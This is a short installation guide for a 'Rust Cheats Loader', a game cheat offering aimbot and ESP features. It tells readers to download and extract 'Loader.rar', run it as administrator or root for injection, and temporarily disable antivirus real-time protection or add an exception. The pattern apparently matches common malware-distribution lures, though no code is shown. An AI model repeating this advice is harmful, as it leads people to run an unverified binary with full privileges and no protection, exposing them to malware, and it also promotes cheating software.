# 📥 Installation Guide

**How to Set Up the Ultimate Rust Cheats Loader (2025 Update):**

1. Download `Loader.rar` from the repository’s root.  
2. Extract `Loader.rar` with a reliable archiver (e.g., WinRAR, 7-Zip, unrar).  
3. Open the extracted directory and review the included `README` and `config.yaml` for customization.  
4. (Optional) Review and modify the `profiles` folder to match your desired configurations: aimbot sensitivity, ESP settings, etc.  
5. Run the loader as **administrator/root** for successful injection (on Linux: use `sudo`).  
6. Launch Rust and activate your desired cheats via the loader’s GUI.

_Note: Some antivirus programs may detect cheat injectors as malicious. Temporarily disable real-time protection or add an exception if needed._
